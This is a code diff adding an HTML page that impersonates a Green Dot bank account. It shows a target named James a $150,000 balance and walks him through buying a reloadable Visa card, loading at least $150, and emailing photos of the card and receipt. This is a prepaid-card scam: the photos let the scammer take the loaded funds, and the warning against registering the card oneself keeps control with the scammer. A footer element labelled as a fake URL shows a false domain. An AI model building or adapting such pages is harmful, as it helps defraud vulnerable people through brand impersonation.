@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Reloadable Account — demo</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="logo">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='28' height='28'%3E%3Ccircle cx='14' cy='14' r='12' fill='%2306a84b'/%3E%3C/svg%3E" alt="logo">
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="greeting">
+      <div class="check">✔</div>
+      <div>You're welcome, <strong id="userName">James</strong></div>
+    </div>
+
+    <section class="card balance-card">
+      <div class="card-title">Available Balance</div>
+      <div class="balance-row">
+        <div class="amount" id="balanceAmount">$150,000.00</div>
+        <button id="toggleBalance" class="eye" aria-label="toggle balance">👁️</button>
+      </div>
+      <div class="muted">Reloadable Deposit Account</div>
+    </section>
+
+    <section class="card gold-card">
+      <div class="brand">greendot<span class="bank"> bank</span></div>
+      <div class="gold-text">
+        James, We're waiting for you to submit Green Dot® Reloadable Visa® Card to link with this account
+      </div>
+      <div class="chip">VISA</div>
+    </section>
+
+    <section class="card steps-card">
+      <h2>Card Registration & Linking Process</h2>
+      <ol>
+        <li>
+          <strong>Provide Your Unregistered Card</strong>
+          <p>Submit a Green Dot® Reloadable Visa® Card for Registration and linking it to your Reloadable Account.</p>
+        </li>
+        <li>
+          <strong>Don't Have One Yet? Here's How to Get It:</strong>
+          <ul>
+            <li>Visit any local store that sells Green Dot® Reloadable Visa® Cards</li>
+            <li>Purchase a card and load a minimum of $150 onto it (this confirms eligibility — not a fee)</li>
+          </ul>
+        </li>
+        <li>
+          <strong>Send Required Proof:</strong>
+          <ul>
+            <li>Take clear photos of the card (front & back) and the purchase receipt.</li>
+            <li>Email these images to the Green Dot email you used for approval.</li>
+          </ul>
+        </li>
+      </ol>
+
+      <div class="after">Once your card is securely linked you can use it to: Withdraw from ATMs · Shop anywhere</div>
+
+      <div class="important">
+        <strong>Important:</strong> Do not register the card yourself or share details with unauthorized parties. Our team will handle the secure registration process.
+      </div>
+    </section>
+  </main>
+
+  <footer class="bottom-bar">
+    <div class="fake-url">it-account-944.created.app</div>
+  </footer>
+
+  <script src="app.js"></script>
+</body>
+</html>
